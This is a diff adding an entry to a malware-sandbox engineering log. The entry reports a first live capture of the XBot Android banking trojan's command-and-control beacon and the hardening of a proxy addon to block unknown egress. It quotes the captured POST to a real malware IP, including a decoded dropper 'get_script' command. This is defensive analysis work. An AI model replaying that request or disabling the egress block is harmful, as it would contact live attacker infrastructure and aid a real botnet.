@@ -1827,3 +1827,45 @@ queue. Until then, any AUROC for a banking classifier must be reported as
 `random-split, family-disjointness unverified`, which is a weaker claim than this project
 should be making.
 
+## 7.10 L2 caught real C2 traffic for the first time, and mitm now contains egress (B41)
+
+Every earlier note in this log records L2 as dead (T14) or, later, MVP-ready but never
+observed catching anything — the SBI sample's payload gates behind a form submit that
+automated navigation never drove, so runs ended `findings=0` / attach-only.
+
+On **2026-08-26** a live detonation of the **XBot** banking trojan
+(`corpus/malware_raw/android-malware/xbot/1264C25D…F61F23.apk`, package `org.merry.core`)
+through `L2/sandbox/orchestrator.py` produced the **first non-zero behavioural capture**.
+XBot beacons its C2 **on launch** — it carries a `BOOT_COMPLETED` receiver, so no UI
+interaction is needed. `L2/sandbox/artifacts/org.merry.core/network_evidence.json` records:
+
+```
+POST http://192.227.137.154/request.php   (application/x-www-form-urlencoded)
+data=eyJuYW1lIjoiYm9vdFNjcmlwdE5ldCIsImFjdGlvbiI6ImdldF9zY3JpcHQifQ%3D%3D
+```
+
+The `data=` field base64-decodes to `{"name":"bootScriptNet","action":"get_script"}` — a
+dropper "fetch second-stage script" command. This settles a claim the log has hedged for
+weeks: the L2 pipeline's capture path demonstrably records real malware traffic. It does
+**not** settle the harder claim — most samples (SBI-style) still need per-sample RE to fire,
+so this is a demonstration on one sample, not a routine.
+
+**`mitm_addon.py` hardened the same day: contain unknown egress by default.** The addon used
+to *forward* any non-honeypot host's HTTP(S) to the real internet (a genuine egress leak —
+XBot's C2 POST would have gone out). All fate decisions now happen in `request()`: known
+bank/UPI/Firebase/Telegram endpoints get their canned fake via a new `_honeypot_response()`
+helper (the old `response()` hook is removed), and every other host is **blocked** — answered
+locally `200 {}`, tagged `blocked: true`, never forwarded. `SENTINEL_MITM_BLOCK_UNKNOWN=0`
+restores forward-and-observe. In the XBot run all 9 outbound requests (the C2 POST + OS
+connectivity checks) were `blocked: true`; the POST to the malware IP was blocked, not
+forwarded. Reported 40/40 L2-related tests pass (not independently re-run for this entry).
+
+**Recorded gaps, so this is not read as "L2 complete":** (a) containment vs observation — a
+blocked C2 sends no command back, so deeper stages (SMS theft, overlay) don't fire without a
+faked reply; (b) the Frida pack hooks *outgoing* `sendTextMessage`, not the *incoming* SMS
+path (broadcast receiver / `SmsMessage.createFromPdu`) XBot-style theft uses; (c)
+`_decode_base64_payload` decodes only raw-JSON bodies, so the `data=<base64>` **form-field**
+beacon was decoded by hand, not auto-flagged; (d) the two known code bugs still stand
+(`honeypot.seed_contacts` binds no name/number; `l2_engine.process` globs all sandbox
+artifact dirs). Full run notes: `docs/l2_droidbot_reliability_log.md` (2026-08-26 entry).
+
